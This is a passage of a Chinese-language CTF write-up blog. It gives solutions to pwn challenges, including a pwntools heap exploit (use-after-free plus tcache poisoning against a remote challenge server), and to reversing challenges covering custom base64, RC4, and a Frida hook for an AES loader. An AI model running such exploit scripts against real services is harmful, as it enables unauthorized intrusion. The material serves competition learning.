class="number">0x100</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1233&quot;)</span></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;blue&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h4 id="ezPwn">ezPwn</h4>
<p>存在UAF，tcachebin attack劫持到flag的地址，show即可得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.timeout = <span class="number">5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.36&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5.exit\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, data=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(sz).encode())</span><br><span class="line">    sa(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    ru(<span class="string">b&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;gift:\n&#x27;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x1a44</span></span><br><span class="line">    flag_addr = codebase + <span class="number">0x4060</span></span><br><span class="line">    log(<span class="string">&quot;codebase&quot;</span>, codebase)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    key = u64(p.recvn(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heapbase = (key &lt;&lt; <span class="number">12</span>) - <span class="number">0x1000</span></span><br><span class="line">    log(<span class="string">&quot;heapbase&quot;</span>, heapbase)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(key ^ flag_addr - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    add(<span class="number">0x400</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h3 id="Reverse">Reverse</h3>
<h4 id="Reverse2">Reverse2</h4>
<p>魔改UPX，用010改回来就行<br>
base64加密<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/de98BY1fDC4TGFL.png"
                        alt="alt text"
                 ><br>
换表<br>
<code>/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA</code><br>
密文<br>
<code>u76svKu5hJvLzpvHnJvGx5nPz53Nz8uaxsfGxseanJnHy83ImoL=</code><br>
直接解密就行了</p>
<h4 id="Reverse1">Reverse1</h4>
<p>RC4加密<br>
把beforemain,aftermain逻辑复制下来，最后把减号改成加就行了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x38</span>, <span class="number">0x47</span>, <span class="number">0x62</span>, <span class="number">0x0A</span>, <span class="number">0x79</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0xC0</span>, <span class="number">0x69</span>, <span class="number">0x8D</span>, <span class="number">0x1C</span>, <span class="number">0x84</span>, <span class="number">0x0F</span>, </span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x08</span>, <span class="number">0xE3</span>, <span class="number">0x30</span>, <span class="number">0x4F</span>, <span class="number">0xB9</span>, <span class="number">0x6C</span>, <span class="number">0xAB</span>, <span class="number">0x36</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0x81</span>, <span class="number">0xCF</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> key1[]=<span class="string">&quot;keykey&quot;</span>;</span><br><span class="line"><span class="type">char</span> key[<span class="number">100</span>]=<span class="string">&quot;ban_debug!&quot;</span>;</span><br><span class="line"><span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> __int8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> __int64;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2,<span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-41Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-41Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-418h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-414h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">258</span>]; <span class="comment">// [rsp+30h] [rbp-410h] BYREF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = (<span class="type">unsigned</span> <span class="type">char</span>)a2[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v8[j] + v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  <span class="title function_">crypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> <span class="type">char</span>)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">crypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] += a1[(<span class="type">unsigned</span> <span class="type">char</span>)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">init(s,key1,<span class="built_in">strlen</span>(key1));</span><br><span class="line">crypt1(s,key,<span class="built_in">strlen</span>(key));</span><br><span class="line"> <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">init(s,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">crypt2(s,cipher,<span class="number">32</span>);</span><br><span class="line"><span class="built_in">puts</span>(cipher);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Reverse3">Reverse3</h4>
<p>程序有花指令和反调试。<br>
去掉花指令后发现并没有什么逻辑。<br>
在TlsCallback_0里发现字符串FileName异或0x11。<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/WSXUuRZjIKL8GJE.png"
                        alt="alt text"
                 ><br>
异或回来找到了1.exe这个程序，加密应该主要位于这里，原本的exe只是一个加载器。<br>
观察1.exe逻辑，是一个aes加密，但是有换盒。<br>
把密钥和密文取出，反出逆s盒，进行aes解密，发现无法解密。<br>
比对内存中的数据和脚本加密数据发现是一样的，解密不可能存在问题。<br>
猜测是加载器修改了key或者其他数据。<br>
frida不会被反调试检测，用frida hook key发现key改变。<br>
输入改变的key仍然不可解密。<br>
接下来hook了sbox，sbox改变，但还是不可解密。<br>
hook密文，发现密文没有改变，那改变的可能是输入的flag数据。<br>
多次hook发现输入的flag每个字节都会有一定偏移。<br>
我们把可打印字符串表作为flag输入，获得字符变化的对应关系。<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/KpsBUy1RDEPLZdx.png"
                        alt="alt text"
                 ><br>
按照对应关系输出aes解密的数据即可得到flag。</p>
<p>frida hook脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inter=<span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sgame = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;1.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sgame==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;无&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">clearInterval</span>(inter);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>+sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001EC9</span>  ));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001EC9</span>  ), &#123; </span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> rax=<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rax</span>; </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span> +rax);</span><br><span class="line">		<span class="comment">// 检查密文有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(rax),&#123;<span class="attr">length</span>: <span class="number">50</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">      </span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001E2C</span>  ), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;input flag&quot;</span>);</span><br><span class="line">  <span class="comment">// 检查输入flag的时候有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rdx</span>),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x1380</span>), &#123; </span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> rdx=<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rdx</span>; </span><br><span class="line">     <span class="comment">// 检查key ,sbox ,进入函数的flag有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(rdx),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag:&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rcx</span>),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sbox:&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x5160</span>)),&#123;<span class="attr">length</span>: <span class="number">256</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125; , <span class="number">1</span>) </span><br></pre></td></tr></table></figure>
<p>逆盒脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">new_s_box = [</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,<span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,<span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,<span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,<span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span 